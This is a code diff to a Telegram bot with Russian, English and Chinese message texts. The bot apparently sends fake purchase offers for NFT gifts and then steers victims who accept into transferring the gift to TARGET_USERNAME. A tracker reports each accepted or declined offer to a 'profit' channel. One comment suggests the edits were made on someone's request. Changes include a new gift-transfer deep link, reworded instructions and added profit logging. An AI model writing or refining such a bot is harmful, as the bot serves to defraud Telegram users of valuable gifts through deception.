@@ -32,7 +32,7 @@ TEXTS = {
         "btn_how": "❓ Как передать?",
         "btn_decline": "❌ Отклонить",
         "btn_accept": "✅ Принять",
-        "alert_how": "Нажмите на кнопку ниже, чтобы открыть профиль получателя.\n\nЗатем нажмите на иконку подарка и выберите «Передать подарок».",
+        "alert_how": "Нажмите на кнопку ниже, чтобы открыть интерфейс подарка.\n\nЗатем выберите подарок и отправьте его получателю.",
         "declined": "Вы отклонили предложение."
     },
     "en": {
@@ -42,7 +42,7 @@ TEXTS = {
         "btn_how": "❓ How to give?",
         "btn_decline": "❌ Decline",
         "btn_accept": "✅ Accept",
-        "alert_how": "Click the button below to open the recipient's profile.\n\nThen click on the gift icon and select 'Give Gift'.",
+        "alert_how": "Click the button below to open the gift interface.\n\nThen choose a gift and send it to the recipient.",
         "declined": "You have declined the offer."
     },
     "cn": {
@@ -52,7 +52,7 @@ TEXTS = {
         "btn_how": "❓ 如何赠送？",
         "btn_decline": "❌ 拒绝",
         "btn_accept": "✅ 接受",
-        "alert_how": "点击下方按钮打开接收者资料页。\n\n然后点击礼物图标并选择“赠送礼物”。",
+        "alert_how": "点击下方按钮打开礼物界面。\n\n然后选择一个礼物并发送给接收者。",
         "declined": "您已拒绝该提议。"
     }
 }
@@ -63,7 +63,6 @@ dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
 http_session: aiohttp.ClientSession = None
 
-# ВАЖНО: Настройки для отображения большой картинки NFT
 LARGE_PREVIEW = LinkPreviewOptions(
     is_disabled=False,
     prefer_large_media=True,
@@ -84,10 +83,11 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    profile_url = f"tg://resolve?domain={TARGET_USERNAME}&profile"
+    # Оставляем как ты просил
+    gift_url = f"tg://premium_offer?domain={TARGET_USERNAME}"
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text=t["btn_give"], url=profile_url)],
+            [InlineKeyboardButton(text=t["btn_give"], url=gift_url)],
             [InlineKeyboardButton(text=t["btn_how"], callback_data=f"alert_2:{lang}")]
         ]
     )
@@ -107,8 +107,8 @@ async def tracker_log(text: str):
         await tracker_bot.send_message(
             PROFIT_CHANNEL_ID, text, message_thread_id=PROFIT_TOPIC_ID
         )
-    except Exception:
-        logging.exception("tracker_log error")
+    except Exception as e:
+        logging.error(f"Tracker error: {e}")
 
 # =====================================
 # ПАРСИНГ НАЗВАНИЯ
@@ -127,7 +127,7 @@ async def fetch_gift_name(url: str) -> str:
     return url.rsplit("/", 1)[-1] or url
 
 # =====================================
-# КОМАНДА .оффер
+# КОМАНДА .оффер (ВОССТАНОВЛЕНА)
 # =====================================
 @dp.business_message(F.text)
 async def handle_custom_command(message: Message):
@@ -177,7 +177,7 @@ async def handle_custom_command(message: Message):
         except Exception as e:
             logging.error(f"Delete error: {e}")
 
-        # Отправляем оффер с БОЛЬШОЙ КАРТИНКОЙ
+        # Отправляем оффер с картинкой
         try:
             await bot.send_message(
                 chat_id=message.chat.id,
@@ -186,10 +186,10 @@ async def handle_custom_command(message: Message):
                     sum=raw_sum,
                     cur=CURRENCY[cur_key],
                     name=gift_name
-                ) + f"\n\n{url}", # Ссылка для картинки добавлена в текст
+                ) + f"\n\n{url}",
                 reply_markup=offer_kb(oid, lang),
                 business_connection_id=message.business_connection_id,
-                link_preview_options=LARGE_PREVIEW # Включаем картинку
+                link_preview_options=LARGE_PREVIEW
             )
             logging.info("Оффер успешно отправлен!")
         except Exception as e:
@@ -203,7 +203,7 @@ async def handle_custom_command(message: Message):
         logging.exception("Ошибка в .оффер")
 
 # =====================================
-# КНОПКИ И ПОДАРКИ (без изменений)
+# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
@@ -211,17 +211,30 @@ async def cb_accept(call: CallbackQuery):
     offer = OFFERS.get(oid)
     if not offer:
         return await call.answer("Оффер не найден", show_alert=True)
-    t = TEXTS.get(offer["lang"], TEXTS["ru"])
+    
+    lang = offer.get("lang", "ru")
+    t = TEXTS.get(lang, TEXTS["ru"])
+
+    text = t["accepted"].format(
+        name=offer["gift_name"],
+        sum=offer["sum"],
+        cur=offer["cur"]
+    ) + f"\n\n{offer['url']}"
+
     try:
         await call.message.edit_text(
-            t["accepted"].format(name=offer["gift_name"], sum=offer["sum"], cur=offer["cur"]),
-            reply_markup=instruction_kb(offer["lang"]),
-            link_preview_options=LARGE_PREVIEW # Оставляем картинку
+            text=text,
+            reply_markup=instruction_kb(lang),
+            link_preview_options=LARGE_PREVIEW
         )
-    except TelegramBadRequest as e:
-        if "message is not modified" not in str(e):
-            logging.error(f"Edit error: {e}")
+    except TelegramBadRequest:
+        pass
+
     await call.answer()
+    await tracker_log(
+        f"✅ Оффер принят\nID: {oid}\nПодарок: {offer['gift_name']}\n"
+        f"Сумма: {offer['sum']} {offer['cur']}"
+    )
 
 @dp.callback_query(F.data.startswith("dec:"))
 async def cb_decline(call: CallbackQuery):
@@ -229,9 +242,17 @@ async def cb_decline(call: CallbackQuery):
     offer = OFFERS.pop(oid, None)
     if not offer:
         return await call.answer("Оффер не найден", show_alert=True)
-    t = TEXTS.get(offer["lang"], TEXTS["ru"])
-    await call.message.edit_text(t["declined"], reply_markup=None)
+
+    lang = offer.get("lang", "ru")
+    t = TEXTS.get(lang, TEXTS["ru"])
+
+    try:
+        await call.message.edit_text(text=t["declined"], reply_markup=None)
+    except TelegramBadRequest:
+        pass
+
     await call.answer()
+    await tracker_log(f"❌ Оффер отклонён\nID: {oid}")
 
 @dp.callback_query(F.data.startswith("alert_2:"))
 async def cb_alert(call: CallbackQuery):
@@ -239,6 +260,9 @@ async def cb_alert(call: CallbackQuery):
     t = TEXTS.get(lang, TEXTS["ru"])
     await call.answer(t["alert_how"], show_alert=True)
 
+# =====================================
+# ПОЛУЧЕНИЕ ПОДАРКА (ЕСЛИ ПРИДЕТ)
+# =====================================
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
     gift = message.gift
@@ -270,6 +294,9 @@ async def handle_gift(message: Message):
     except Exception as e:
         logging.error(f"HTTP error: {e}")
 
+# =====================================
+# ЗАПУСК
+# =====================================
 async def main():
     global http_session
     http_session = aiohttp.ClientSession()
